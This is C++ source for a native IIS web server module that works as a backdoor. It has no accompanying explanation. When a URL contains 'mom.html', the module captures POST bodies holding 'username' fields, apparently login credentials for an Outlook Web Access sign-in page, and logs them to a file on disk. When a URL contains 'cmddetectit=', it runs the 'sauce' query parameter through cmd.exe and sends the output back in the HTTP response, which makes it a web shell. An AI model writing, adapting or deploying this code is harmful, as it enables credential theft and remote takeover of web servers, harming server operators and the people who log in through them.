#define _WINSOCKAPI_
#include <windows.h>
#include <sal.h>
#include <httpserv.h>
#include <wchar.h>
#include <sstream>   // Include for std::wstringstream
#include <string>    // Include for std::wstring
#include <fstream>
#include <strsafe.h>
#include <sstream>
#include <wincrypt.h>

#define MAX_DATA 50000
#define BUFSIZE 5120

// Create the module class.
class MyHttpModule : public CHttpModule
{


    bool ContainsSubstring(PCWSTR urlBuffer, PCWSTR substring)
    {
        PCWSTR result = wcsstr(urlBuffer, substring);
        return (result != NULL);
    }

    std::string ConvertWStringToStdString(const wchar_t* wstr) {
        std::wstring wtemp(wstr);
        return std::string(wtemp.begin(), wtemp.end());
    }

    std::string ExtractQueryParamValue(PCWSTR urlw, const std::string& param) {
        std::string url = ConvertWStringToStdString(urlw);
        std::size_t start = url.find(param + "=");
        if (start == std::string::npos)
            return ""; // Parameter not found

        start += param.length() + 1; // Move past the parameter name and '='

        std::size_t end = url.find('&', start);
        if (end == std::string::npos)
            end = url.length(); // If no '&' found, take the rest of the string

        return url.substr(start, end - start);
    }


//
// Execute a command and get the results. (Only standard output)
//
    LPSTR cmdResult = const_cast<LPSTR>("");


    BOOL RunCommand(OUT LPVOID lpData, IN LPSTR Command) {

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        SECURITY_ATTRIBUTES sa;
        HANDLE hStdOUT_RD = NULL;
        HANDLE hStdOUT_WR = NULL;

        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        CreatePipe(&hStdOUT_RD, &hStdOUT_WR, &sa, 0);

        // Define the handles.
        ZeroMemory(&si, sizeof(STARTUPINFOA));
        si.cb = sizeof(STARTUPINFOA);
        si.hStdError = hStdOUT_WR;
        si.hStdOutput = hStdOUT_WR;
        si.dwFlags |= STARTF_USESTDHANDLES;

        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        DWORD dwCommandSize = MAX_PATH;
        LPSTR lpCommand = (LPSTR)VirtualAlloc(NULL, dwCommandSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        StringCbPrintfA(lpCommand, dwCommandSize, "/c %s", Command);

        CreateProcessA("C:\\Windows\\system32\\cmd.exe", lpCommand, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        CloseHandle(hStdOUT_WR);

        VirtualFree((LPVOID)lpCommand, dwCommandSize, MEM_DECOMMIT);

        DWORD dwRead = 0;
        DWORD dwAll = 0;
        char chRBuf[BUFSIZE];

        LPVOID lpTmpBuffer = lpData;

        // There is a problem with readfile when there is nothing to read at all.
        while (TRUE) {
            ReadFile(hStdOUT_RD, chRBuf, BUFSIZE, &dwRead, NULL);

            if (dwRead == 0) break;

            lpTmpBuffer = static_cast<char*>(lpData) + dwAll;
            dwAll += dwRead;



            // If data is bigger the expected size stop overflow.
            if (dwAll >= MAX_DATA) break;
            CopyMemory(lpTmpBuffer, chRBuf, dwRead);
            ZeroMemory(&chRBuf, BUFSIZE);
        }

        cmdResult = static_cast<LPSTR>(lpData);




        CloseHandle(hStdOUT_RD);

        return TRUE;

    }
    std::string UrlDecode(const std::string& str) {
        std::string result;
        char ch;
        int i, j;
        for (i = 0; i < str.length(); i++) {
            if (str[i] == '%') {
                sscanf_s(str.substr(i + 1, 2).c_str(), "%x", &j);
                ch = static_cast<char>(j);
                result += ch;
                i += 2;
            }
            else if (str[i] == '+') {
                result += ' ';
            }
            else {
                result += str[i];
            }
        }
        return result;
    }



public:
    REQUEST_NOTIFICATION_STATUS
        OnBeginRequest(
            IN IHttpContext* pHttpContext,
            IN IHttpEventProvider* pProvider
        )
    {
        UNREFERENCED_PARAMETER(pProvider);

        // Create an HRESULT to receive return values from methods.
        PCWSTR urlBuffer = L""; // Initialize pszBuffer with an empty wide string
        PCWSTR urlCheck = L""; // Initialize pszBuffer with an empty wide string
        DWORD dwData = MAX_DATA;
        LPVOID Data = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        LPVOID b64Data = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        USHORT usHeaderSize = 0;
        LPCSTR lpHeader = NULL;

        // Retrieve a pointer to the response.
        IHttpResponse* pHttpResponse = pHttpContext->GetResponse();
        IHttpRequest* pHttpRequest = pHttpContext->GetRequest();


        if (pHttpRequest != NULL)
        {
            // Create a string with the response.
            urlBuffer = pHttpContext->GetRequest()->GetRawHttpRequest()->CookedUrl.pFullUrl;

            PCWSTR substring = L"mom.html";
            urlCheck = L"unexecutedunexecutedunexecutedunexecutedunexecutedunexecutedunexecutedunexecutedunexecutedunexecuted";

            if (ContainsSubstring(urlBuffer, substring))
            {

                OutputDebugStringW(L"Received http request with owa/auth.owa found, continuing to check for post parameters.."); // Send the length to the debug output
                urlCheck = L"YES";

                // Extract Body
                LPVOID FormData = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                DWORD dwFormDataSize = 1024;
                HRESULT hrReadResult = pHttpRequest->ReadEntityBody(FormData, dwFormDataSize, FALSE, &dwFormDataSize, NULL);

                if (hrReadResult == S_OK) {
                    // Check if it contains the password keyword.
                    LPCSTR lpFound = strstr((LPCSTR)FormData, "username");
                    if (lpFound != NULL) {
                        // Convert narrow string (LPCSTR) to wide string (LPCWSTR)
                        std::string narrowStr(lpFound);
                        std::wstring wideStr(narrowStr.begin(), narrowStr.end());

                        // Create a wide string to add in front
                        std::wstring prefix = L"Found user: ";

                        // Concatenate the strings
                        std::wstring message = prefix + wideStr;

                        // Display the message
                        OutputDebugStringW(message.c_str());

                        //SAVE TO FILE
                            // Save the message to a text file
                        std::wofstream outputFile("C:\\outputlog.txt", std::ios::out | std::ios::app);
                        if (outputFile.is_open())
                        {
                            outputFile << message << std::endl;
                            outputFile.close();
                        }

                    }

                    

                }

            }
            else
            {
                urlCheck = L"NO";
            }
            PCWSTR substring2 = L"cmddetectit=";

            if (ContainsSubstring(urlBuffer, substring2))
            {
                char stuffer[4096]; // Buffer to store the received data
                memset(stuffer, 0, sizeof(stuffer)); // Initialize the buffer to all zeros

                std::string paramValue = UrlDecode(ExtractQueryParamValue(urlBuffer, "sauce"));
                LPSTR lpCommand = const_cast<LPSTR>(paramValue.c_str());
                // Call the RunCommand function
                BOOL success = RunCommand(stuffer, lpCommand);
                OutputDebugStringA("Data received : ");
                OutputDebugStringA(static_cast<LPCSTR>(stuffer));


            }

        }


        if (pHttpResponse != NULL) {



            // Create an HRESULT to receive return values from methods.
            HRESULT hr;

            // Create an array of data chunks.
            HTTP_DATA_CHUNK dataChunk[1];

            // Buffer for bytes written of data chunk.
            DWORD cbSent;

            size_t length = wcslen(urlCheck);
            wchar_t debugMsg[100]; // Adjust the buffer size as needed
            swprintf_s(debugMsg, sizeof(debugMsg) / sizeof(wchar_t), L"Length: %zu", length);

            OutputDebugStringW(debugMsg); // Send the length to the debug output

            OutputDebugStringW(urlCheck); // Send the length to the debug output

            if (strcmp(cmdResult, "") != 0) {

                pHttpResponse->Clear();
                pHttpResponse->SetHeader(
                HttpHeaderContentType, "text/plain",
                    (USHORT)strlen("text/plain"), TRUE);


                OutputDebugStringA(static_cast<LPCSTR>(cmdResult));


                dataChunk[0].DataChunkType = HttpDataChunkFromMemory;
                dataChunk[0].FromMemory.pBuffer = (PVOID)cmdResult;
                dataChunk[0].FromMemory.BufferLength = strlen(cmdResult); // Size in bytes (not wide characters)



                // Write the data chunk to the response
                //hr = pHttpContext->GetResponse()->WriteEntityChunks(
                    //dataChunk, 1, FALSE, TRUE, &cbSent);
                hr = pHttpResponse->WriteEntityChunks(
                    dataChunk, 1, FALSE, TRUE, &cbSent);



                return RQ_NOTIFICATION_FINISH_REQUEST;

            }

            else {

                // Set the chunk to a chunk in memory.
                //dataChunk[0].DataChunkType = HttpDataChunkFromMemory;
                // Set the chunk to the first buffer.
                //dataChunk[0].FromMemory.pBuffer = (PVOID)urlBuffer;
                // Set the chunk size to the first buffer size in bytes (not wide characters).
                //dataChunk[0].FromMemory.BufferLength = wcslen(urlBuffer) * sizeof(WCHAR); // Size in bytes

                // Write the data chunk to the response
                //hr = pHttpContext->GetResponse()->WriteEntityChunks(
                //    dataChunk, 1, FALSE, TRUE, &cbSent);
                return RQ_NOTIFICATION_CONTINUE;

            }






            

        }
    }
};

// Create the module's class factory.
class MyHttpModuleFactory : public IHttpModuleFactory
{
public:
    HRESULT
        GetHttpModule(
            OUT CHttpModule** ppModule,
            IN IModuleAllocator* pAllocator
        )
    {
        UNREFERENCED_PARAMETER(pAllocator);

        // Create a new instance.
        MyHttpModule* pModule = new MyHttpModule;

        // Test for an error.
        if (!pModule)
        {
            // Return an error if the factory cannot create the instance.
            return HRESULT_FROM_WIN32(ERROR_NOT_ENOUGH_MEMORY);
        }
        else
        {
            // Return a pointer to the module.
            *ppModule = pModule;
            pModule = NULL;
            // Return a success status.
            return S_OK;
        }
    }

    void Terminate()
    {
        // Remove the class from memory.
        delete this;
    }
};

// Create the module's exported registration function.
HRESULT
__stdcall
RegisterModule(
    DWORD dwServerVersion,
    IHttpModuleRegistrationInfo* pModuleInfo,
    IHttpServer* pGlobalInfo
)
{
    UNREFERENCED_PARAMETER(dwServerVersion);
    UNREFERENCED_PARAMETER(pGlobalInfo);

    // Set the request notifications and exit.
    return pModuleInfo->SetRequestNotifications(
        new MyHttpModuleFactory,
        RQ_BEGIN_REQUEST,
        0
    );
}